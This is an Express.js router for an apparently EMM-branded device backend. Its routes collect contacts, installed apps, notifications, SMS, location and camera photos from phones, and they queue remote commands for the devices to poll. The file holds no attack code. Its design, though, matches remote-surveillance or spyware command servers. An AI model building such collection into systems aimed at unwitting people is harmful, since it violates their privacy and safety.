const express = require('express');
const router = express.Router();
const deviceController = require('../controllers/deviceController');

// Route to register/sync device specs & state
router.post('/sync', deviceController.syncDevice);

// Routes to sync specific collected data
router.post('/sync/contacts', deviceController.syncContacts);
router.post('/sync/apps', deviceController.syncInstalledApps);
router.post('/sync/notification', deviceController.syncNotification);
router.post('/sync/location', deviceController.syncLocation);

// Route to get list of all devices
router.get('/', deviceController.getDevices);

// Route to issue a command to a specific device (admin → device)
router.post('/:deviceId/command', deviceController.issueCommand);

// Route for Flutter device to poll & auto-clear its pending command
router.get('/:deviceId/poll-command', deviceController.pollCommand);

// Route to update EMM policy parameters
router.post('/:deviceId/policy', deviceController.updatePolicy);

// Route to handle incoming base64 camera pictures uploaded by client terminals
router.post('/:deviceId/photo', deviceController.uploadPhoto);

// Route to get specific device details (including SMS, contacts, notifications, apps, location logs)
router.get('/:deviceId', deviceController.getDeviceDetails);

// Route to delete a device and its logs
router.delete('/:deviceId', deviceController.deleteDevice);

module.exports = router;
